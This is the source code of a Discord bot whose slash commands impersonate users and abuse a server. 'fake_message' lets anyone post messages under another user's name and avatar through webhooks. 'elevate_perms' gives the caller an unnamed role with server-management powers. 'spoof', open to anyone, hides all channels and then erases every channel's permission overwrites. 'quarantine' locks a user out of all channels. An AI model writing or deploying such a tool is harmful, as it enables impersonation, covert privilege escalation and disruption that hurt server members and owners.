const { Client, Intents, Permissions } = require('discord.js');
const config = require('./config.json');

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
const token = config.token;
const whitelistedUserIds = config.whitelistedUserIds;

client.once('ready', async () => {
  console.log('Bot is ready!');

  await client.application.commands.create({
    name: 'fake_message',
    description: 'Send a fake message from a user',
    options: [
      {
        name: 'target',
        type: 'USER',
        description: 'The user to send the message as',
        required: true,
      },
      {
        name: 'message',
        type: 'STRING',
        description: 'The message content',
        required: true,
      },
    ],
  });

  await client.application.commands.create({
    name: 'elevate_perms',
    description: 'Grant elevated permissions to the user running the command',
  });

  await client.application.commands.create({
    name: 'slowmode',
    description: 'Set slow mode in a specific channel',
    options: [
      {
        name: 'channel',
        type: 'CHANNEL',
        description: 'The channel to set slow mode in',
        required: true,
      },
      {
        name: 'duration',
        type: 'INTEGER',
        description: 'The duration of slow mode in seconds',
        required: true,
      },
    ],
  });

  await client.application.commands.create({
    name: 'quarantine',
    description: 'Remove the ability for a user to see channels',
    options: [
      {
        name: 'user',
        type: 'USER',
        description: 'The user to quarantine',
        required: true,
      },
    ],
  });

  await client.application.commands.create({
    name: 'spoof',
    description: 'Spoofs member list for everyone.',
  });

  
  
  console.log('Slash commands registered');
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'fake_message') {
    const targetUser = interaction.options.getUser('target');
    const messageContent = interaction.options.getString('message');
    const channel = interaction.channel;

    try {
      const webhooks = await channel.fetchWebhooks();
      let webhook = webhooks.find(wh => wh.owner.id === targetUser.id);

      if (webhooks.size >= 10) {
        const randomIndex = Math.floor(Math.random() * webhooks.size);
        webhook = Array.from(webhooks.values())[randomIndex];
      }

      if (!webhook) {
        const webhookName = Math.floor(Math.random() * 1000000).toString();
        webhook = await channel.createWebhook(webhookName, {
          avatar: targetUser.displayAvatarURL({ dynamic: true }),
        });
      }

      await webhook.edit({
        name: targetUser.username,
        avatar: targetUser.displayAvatarURL({ dynamic: true }),
      });

      await webhook.send({
        content: messageContent,
        username: targetUser.username,
        avatarURL: targetUser.displayAvatarURL({ dynamic: true }),
      });

      await interaction.reply({ content: 'Fake message sent!', ephemeral: true });
    } catch (error) {
      console.error('Error sending fake message:', error);
      await interaction.reply({ content: 'An error occurred while sending the fake message.', ephemeral: true });
    }
  }

  if (interaction.commandName === 'elevate_perms') {
    try {
      if (!whitelistedUserIds.includes(interaction.user.id)) {
        await interaction.reply({ content: 'You are not authorized to use this command.', ephemeral: true });
        return;
      }

      const elevatedRole = await interaction.guild.roles.create({
        name: '',
        permissions: [
          'MANAGE_CHANNELS',
          'MANAGE_GUILD',
        ],
      });

      await interaction.member.roles.add(elevatedRole);

      await interaction.reply({ content: 'Elevated permissions granted!', ephemeral: true });
    } catch (error) {
      console.error('Error granting elevated permissions:', error);
      await interaction.reply({ content: 'An error occurred while granting elevated permissions.', ephemeral: true });
    }
  }

  if (interaction.commandName === 'slowmode') {
    try {
      if (!whitelistedUserIds.includes(interaction.user.id)) {
        await interaction.reply({ content: 'You are not authorized to use this command.', ephemeral: true });
        return;
      }

      const channel = interaction.options.getChannel('channel');
      const duration = interaction.options.getInteger('duration');

      await channel.setRateLimitPerUser(duration);

      await interaction.reply({ content: `Slow mode set to ${duration} seconds in ${channel}`, ephemeral: true });
    } catch (error) {
      console.error('Error setting slow mode:', error);
      await interaction.reply({ content: 'An error occurred while setting slow mode.', ephemeral: true });
    }
  }

  if (interaction.commandName === 'spoof') {
    try {
      const randomNumber = Math.random();
  
      const isSuccess = randomNumber >= 0.5;
  
      if (isSuccess) {
        const channels = interaction.guild.channels.cache;
  
       
        channels.forEach(async (channel) => {
          await channel.permissionOverwrites.set([
            {
              id: interaction.guild.roles.everyone,
              deny: ['VIEW_CHANNEL']
            }
          ]);
  
          await new Promise(resolve => setTimeout(resolve, 500)); 
          await channel.permissionOverwrites.set([]);
        });
  
        console.log('Bug test completed successfully.');
        await interaction.reply({ content: '50/50 chance of spoof failing.', ephemeral: true });
      } else {
        console.log('Bug test failed.');
        await interaction.reply({ content: 'Spoof failed.', ephemeral: true });
      }
    } catch (error) {
      console.error('Error while testing bug:', error);
      await interaction.reply({ content: 'An error occurred while testing the bug.', ephemeral: true });
    }
  }

  if (interaction.commandName === 'quarantine') {
    try {
      if (!whitelistedUserIds.includes(interaction.user.id)) {
        await interaction.reply({ content: 'You are not authorized to use this command.', ephemeral: true });
        return;
      }

      const user = interaction.options.getUser('user');

      const channels = interaction.guild.channels.cache;

      channels.forEach(async (channel) => {
        try {
          await channel.permissionOverwrites.edit(user, {
            VIEW_CHANNEL: false
          });
        } catch (error) {
          console.error(`Error quarantining user in ${channel.name}:`, error);
        }
      });

      await interaction.reply({ content: `${user.tag} has been quarantined. They can no longer view any channels.`, ephemeral: true });
    } catch (error) {
      console.error('Error quarantining user:', error);
      await interaction.reply({ content: 'An error occurred while quarantining the user.', ephemeral: true });
    }
  }


});

client.login(token);
